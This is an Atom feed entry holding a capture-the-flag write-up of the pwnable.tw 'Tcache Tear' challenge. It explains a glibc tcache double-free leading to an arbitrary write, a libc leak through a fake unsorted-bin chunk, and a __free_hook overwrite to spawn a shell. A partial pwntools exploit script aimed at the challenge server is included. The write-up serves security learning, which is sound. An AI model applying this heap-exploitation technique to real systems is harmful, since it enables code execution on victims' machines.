@@ -1,0 +1,258 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en">
+	<title> - double-free</title>
+	<link href="/tags/double-free/atom.xml" rel="self" type="application/atom+xml"/>
+  <link href="/"/>
+	<generator uri="https://www.getzola.org/">Zola</generator>
+	<updated>2020-03-02T18:52:31.838+00:00</updated>
+	<id>/tags/double-free/atom.xml</id>
+	<entry xml:lang="en">
+		<title>pwnable.tw - Tcache Tear</title>
+		<published>2020-02-23T07:19:49.665+00:00</published>
+		<updated>2020-03-02T18:52:31.838+00:00</updated>
+		<link href="/posts/pwnable-tw-tcache-tear/" type="text/html"/>
+		<id>/posts/pwnable-tw-tcache-tear/</id>
+		<content type="html">&lt;h1 id=&quot;challenge&quot;&gt;Challenge&lt;&#x2F;h1&gt;
+&lt;blockquote&gt;
+&lt;p&gt;Make tcache great again !&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;code&gt;nc chall.pwnable.tw 10207&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;chall&#x2F;tcache_tear&quot;&gt;tcache_tear&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;pwnable.tw&#x2F;static&#x2F;libc&#x2F;libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so&quot;&gt;libc.so&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
+&lt;&#x2F;blockquote&gt;
+&lt;h1 id=&quot;background&quot;&gt;Background&lt;&#x2F;h1&gt;
+&lt;p&gt;Per-thread cache (tcache) is an optimization enabled in versions of &lt;code&gt;libc&lt;&#x2F;code&gt; after 2.26. To increase heap performance, 
+security checks are limited within the tcache implementation. Tcache is implemented using two important internal structures:&lt;&#x2F;p&gt;
+&lt;span id=&quot;continue-reading&quot;&gt;&lt;&#x2F;span&gt;&lt;h2 id=&quot;tcache-perthread-struct&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bminor&#x2F;glibc&#x2F;blob&#x2F;release&#x2F;2.27&#x2F;master&#x2F;malloc&#x2F;malloc.c#L2916&quot;&gt;tcache_perthread_struct&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;typedef struct&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; tcache_perthread_struct
+{
+  &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;char&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt; counts[TCACHE_MAX_BINS];
+  tcache_entry &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;entries[TCACHE_MAX_BINS];
+} tcache_perthread_struct;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;There is maximum number of entries and bins within the tcache that are defined at compile time.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;tcache-entry&quot;&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bminor&#x2F;glibc&#x2F;blob&#x2F;release&#x2F;2.27&#x2F;master&#x2F;malloc&#x2F;malloc.c#L2904&quot;&gt;tcache_entry&lt;&#x2F;a&gt;&lt;&#x2F;h2&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;typedef struct tcache_entry
+{
+  struct tcache_entry *next;
+} tcache_entry;
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;This structure is placed within the user area of a chunk when it is freed, i.e. it is placed at the address returned by &lt;code&gt;malloc&lt;&#x2F;code&gt;. This has some security implications.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;behind-the-scenes-tcache&quot;&gt;Behind the Scenes: tcache&lt;&#x2F;h1&gt;
+&lt;p&gt;The below diagram depicts normal operation of tcache with the given initial conditions.&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e5d5509c800e40a7578f781.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;reversing&quot;&gt;Reversing&lt;&#x2F;h1&gt;
+&lt;p&gt;First, we have to reverse the binary, which isn&#x27;t too difficult with Ghidra.&lt;&#x2F;p&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;void main(void)
+
+{
+  longlong input;
+  uint i;
+  
+  set_alarm();
+  printf(&amp;quot;Name:&amp;quot;);
+  read(buffer,0x20);
+  i = 0;
+  do {
+    while( true ) {
+      while( true ) {
+        print_menu();
+        input = read_ll();
+        if (input != 2) break;
+        if (i &amp;lt; 8) {
+          free(malloced);
+          i = i + 1;
+        }
+      }
+      if (2 &amp;lt; input) break;
+      if (input == 1) {
+        malloc_m();
+      }
+      else {
+LAB_00400c75:
+        puts(&amp;quot;Invalid choice&amp;quot;);
+      }
+    }
+    if (input != 3) {
+      if (input == 4) {
+                    &#x2F;* WARNING: Subroutine does not return *&#x2F;
+        exit(0);
+      }
+      goto LAB_00400c75;
+    }
+    print_buffer();
+  } while( true );
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;color:#323232;&quot;&gt;void malloc_m(void)
+
+{
+  ulong size;
+  
+  printf(&amp;quot;Size:&amp;quot;);
+  size = read_ll();
+  if (size &amp;lt; 0x100) {
+    malloced = malloc(size);
+    printf(&amp;quot;Data:&amp;quot;);
+    read((char *)malloced,(int)size - 0x10);
+    puts(&amp;quot;Done !&amp;quot;);
+  }
+  return;
+}
+&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
+&lt;p&gt;The binary reads &lt;code&gt;0x20&lt;&#x2F;code&gt; bytes into a global buffer. Then, it displays a menu:&lt;&#x2F;p&gt;
+&lt;p&gt;&lt;img src=&quot;&#x2F;posts&#x2F;pwnable-tw-tcache-tear&#x2F;5d99297adf0cde08ea5c061d.png&quot; alt=&quot;&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
+&lt;p&gt;We are able to &lt;code&gt;malloc&lt;&#x2F;code&gt; arbitrary sizes (under 0x100) and &lt;code&gt;free&lt;&#x2F;code&gt; the last allocated chunk (up to 8 times).&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;attacks&quot;&gt;Attacks&lt;&#x2F;h1&gt;
+&lt;h2 id=&quot;circular-list&quot;&gt;Circular List&lt;&#x2F;h2&gt;
+&lt;p&gt;The given tcache implementation has no checks to detect double frees. Consider the following initial state:&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e5d5542c800e40a7578f783.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;p&gt;If we call &lt;code&gt;free(0x603260)&lt;&#x2F;code&gt; twice, we add the &lt;code&gt;tcache_entry&lt;&#x2F;code&gt; to the free list again, which results in a circular list:&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e5d5552c800e40a7578f785.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;p&gt;If we call &lt;code&gt;malloc&lt;&#x2F;code&gt; now with the same size as the double freed chunk, we will receive that chunk again. If we are able 
+to write in the chunk, we can overwrite the &lt;code&gt;next&lt;&#x2F;code&gt; pointer because libc does not expect the chunk to be in use. Then, 
+&lt;code&gt;malloc&lt;&#x2F;code&gt; will return the written address + 0x10 due to the chunk header.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;achieving-arbitrary-write&quot;&gt;Achieving Arbitrary Write&lt;&#x2F;h2&gt;
+&lt;p&gt;We can abuse this double free to force malloc to return an arbitrary pointer to any memory location. Because the binary 
+allows us to write to the location returned by malloc, we have arbitrary write:&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e5d5571c800e40a7578f787.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;leaking-libc&quot;&gt;Leaking libc&lt;&#x2F;h2&gt;
+&lt;p&gt;Even with the arbitrary write, we don&#x27;t have anything to write to. Leaking libc will allow us to overwrite &lt;code&gt;__free_hook&lt;&#x2F;code&gt; 
+or &lt;code&gt;__malloc_hook&lt;&#x2F;code&gt; with a call to system. &lt;&#x2F;p&gt;
+&lt;p&gt;The internal representation of a free &lt;code&gt;chunk&lt;&#x2F;code&gt; is something similar to:&lt;&#x2F;p&gt;
+&lt;p&gt;svg(path=&amp;quot;5e5d558bc800e40a7578f789.svg&amp;quot;)&lt;&#x2F;p&gt;
+&lt;p&gt;Unsorted bins are a circularly linked list. This means that in an unsorted bin with a single chunk, the chunk will have 
+its &lt;code&gt;fwd&lt;&#x2F;code&gt; and &lt;code&gt;bck&lt;&#x2F;code&gt; pointers set to the address of the unsorted bin. If we are able to read either the &lt;code&gt;fwd&lt;&#x2F;code&gt; or &lt;code&gt;bck&lt;&#x2F;code&gt; 
+pointer, we have an address with a known offset from libc.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;crafting-chunks&quot;&gt;Crafting Chunks&lt;&#x2F;h2&gt;
+&lt;p&gt;Luckily, we have the &lt;code&gt;name&lt;&#x2F;code&gt; buffer and can print its contents. If we create a fake chunk of unsorted bin size and place 
+it in the name buffer, we can leak libc. &lt;&#x2F;p&gt;
+&lt;p&gt;Unfortunately, there are some &lt;a href=&quot;https:&#x2F;&#x2F;heap-exploitation.dhavalkapil.com&#x2F;diving_into_glibc_heap&#x2F;security_checks.html&quot;&gt;security checks&lt;&#x2F;a&gt;:&lt;&#x2F;p&gt;
+&lt;ul&gt;
+&lt;li&gt;&amp;quot;Check whether next chunk&#x27;s (by memory) previous in use bit is marked&amp;quot;&lt;&#x2F;li&gt;
+&lt;li&gt;&amp;quot;Check whether size of next chunk is within the minimum and maximum size (av-&amp;gt;system_mem)&amp;quot;&lt;&#x2F;li&gt;
+&lt;li&gt;&amp;quot;If the chunk is not within the size range of fastbin and isn&#x27;t mmapped, check that it is not the same as the top chunk&amp;quot;&lt;&#x2F;li&gt;
+&lt;&#x2F;ul&gt;
+&lt;p&gt;To bypass these checks we can create another chunk that is positioned immediately after the first chunk. The comments in 
+the solution script explain this further.&lt;&#x2F;p&gt;
+&lt;h2 id=&quot;getting-a-shell&quot;&gt;Getting a Shell&lt;&#x2F;h2&gt;
+&lt;p&gt;Now that we have the libc base address, we can get the address of &lt;code&gt;__free_hook&lt;&#x2F;code&gt;. This is a function pointer that is 
+called whenever free is called; the address of the chunk being freed is passed as a parameter. Conveniently, this 
+function signature matches &lt;code&gt;system(char* cmd)&lt;&#x2F;code&gt;. &lt;&#x2F;p&gt;
+&lt;p&gt;Now, if we call &lt;code&gt;malloc(&amp;quot;&#x2F;bin&#x2F;sh\x00&amp;quot;)&lt;&#x2F;code&gt; and then free the returned value, a shell is created.&lt;&#x2F;p&gt;
+&lt;h1 id=&quot;solution&quot;&gt;Solution&lt;&#x2F;h1&gt;
+&lt;pre style=&quot;background-color:#ffffff;&quot;&gt;
+&lt;code&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;from &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;pwn &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;import &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;*
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;context.terminal &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;&#x2F;bin&#x2F;sh&amp;#39;
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;remote(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;chall.pwnable.tw&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;10207&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+
+elf &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;tcache_tear&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+libc &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;ELF(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;.&#x2F;libc.so.6&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;malloc&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size, data):
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc_counter
+	malloc_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+
+	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Size:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(size))
+	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Data:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.send(data)
+	
+	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;[Malloc &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;] Allocated chunk [size: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;, data: &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;]&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(malloc_counter, size, data))
+
+free_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;malloc_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;free&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;global &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free_counter
+	free_counter &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;1
+	&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;2&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;  [Free &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;{n}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;] Freed last allocated chunk&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;.format(n&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free_counter))
+
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;mem_write&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(address, value, s):
+	info(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;[Mem Write ] Writing &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt; to &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot; &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(value, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;hex&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(address)))
+	malloc(s, &lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;quot;anything&amp;quot;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	free()
+	free()
+	malloc(s, p64(address))
+	malloc(s, p64(address))
+	malloc(s, value)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#323232;&quot;&gt;get_info&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;():
+	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39; :&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;return &lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;r.recv(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x20&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(elf.got)
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#62a35c;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;(elf.symbols)
+
+r.recvuntil(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;Name:&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+r.send(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#183691;&quot;&gt;&amp;#39;anything&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+
+mem_write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602550&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;, 
+			p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Previous Size
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Chunk Size (A=0, M=0, P=1)
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Forward Pointer
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Backward Pointer
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+ 	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Empty Space
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x21&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;),	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Next Previous Size
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x70&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+mem_write(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602050&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;,
+			p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602050		Previous Size 
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x501&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602058		Chunk Size (A=0, M=0, P=1)
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602060[name_buffer]	Forward Pointer
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;) &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602068		Backward Pointer
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;3 &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;+	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602070		Empty Space
+			&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;p64(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x602060&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;),	&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# 0x602088[malloced] 	Overwrite the last malloced value
+		&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x60&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;)
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# Next free will be free(0x602060) because we overwrote the last malloced value.
+
+# Note that we need the free to be 0x602060 because free expects the user region of the chunk,
+# not the start of the chunk
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#323232;&quot;&gt;free()  &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#969896;&quot;&gt;# free(0x602060)
+
+# This free will overwrite the forward and backward pointer. Since this chunk is the only chunk 
+# stored in an unsorted bin, the fwd and bck pointers will point to the location of the bin within
+# libc. This location will have a constant offset with libc base.
+
+&lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;LEAKED_CHUNK_OFFSET &lt;&#x2F;span&gt;&lt;span style=&quot;font-weight:bold;color:#a71d5d;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#0086b3;&quot;&gt;0x3ebca0
+
